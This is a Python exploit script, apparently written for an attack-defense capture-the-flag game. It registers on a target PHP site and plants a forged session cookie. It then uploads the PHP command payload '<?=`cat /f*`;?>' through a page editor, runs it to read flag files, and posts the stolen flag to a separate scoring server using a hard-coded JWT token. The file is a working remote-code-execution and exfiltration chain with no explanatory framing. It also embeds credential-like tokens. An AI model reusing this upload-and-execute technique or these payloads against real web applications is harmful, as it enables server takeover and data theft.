#!/usr/bin/env python3

import requests
import sys
import re

host = sys.argv[1]

SYSTEM_URL = 'http://13.212.152.221:5000/api/flag'
SYSTEM_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcyNDIwNjIyOSwianRpIjoiNzliNmQwYWMtMDZlNS00NTliLWE4ZjAtMGM5MjYxNjllM2Q4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6eyJ1c2VybmFtZSI6IkdpcmxzIEJhbmQgQ3J5In0sIm5iZiI6MTcyNDIwNjIyOSwiY3NyZiI6ImRjY2NhZjM3LTgyMDYtNDI1Ny04MThmLTBjZDg3MDgwYTU4NiIsImV4cCI6MTcyNDI5MjYyOX0.hPz00_Z06cWm0VtzpjZgvjdor4n78vzqmTT3ouMsIIM'
token = "Bearer " + SYSTEM_TOKEN

sess = requests.Session()
r = sess.post("http://" + host + ":13000/index.php?module=user&action=register", data={
    "username": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "password": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
})
print("register", r.status_code)

r = sess.post("http://" + host + ":13000/index.php?module=user&action=login", data={
    "username": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "password": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
})
print("login", r.status_code)

sess.cookies['session'] = "eyJ0b2tlbiI6ImRYTmxjam8zWTJGa1l6UXhZakZoWkRVeE1HWXhZVFZpWVdFek0yTTVNMk5qWlRVeE5EcEdZV3h6WlE9PSJ9.ZsVP6g.8yBpXbGpNk38sV2fcZ4zAuuLPzU;type=html"
r = sess.post("http://" + host + ":13000/index.php?module=page&action=edit&type=html", data={
    "data": "<?=`cat /f*`;?>",
    "type": "php",
})
print(sess.cookies)
print("edit", r.status_code)

r = sess.get("http://" + host + ":13000/index.php?module=page&action=viewPage")
stuff = r.text.split("script")[1].replace("></", "").replace("src=", "").replace('"', "").replace("./", "/").replace(".js", ".php").strip()
print(stuff)

r = sess.get("http://" + host + ":13000" + stuff)
try:
    base64_string = re.search(r'WreckIT50\{([^}]+)\}', r.text).group(1)
    print(base64_string)
    r = requests.post(SYSTEM_URL,
                        headers={
                            'Authorization': token,
                            'Content-Type': 'application/json'
                            },
                        json={
                                'flag': base64_string
                        })
    print(base64_string, flush=True)
    print(r.json())
except:
    exit(1)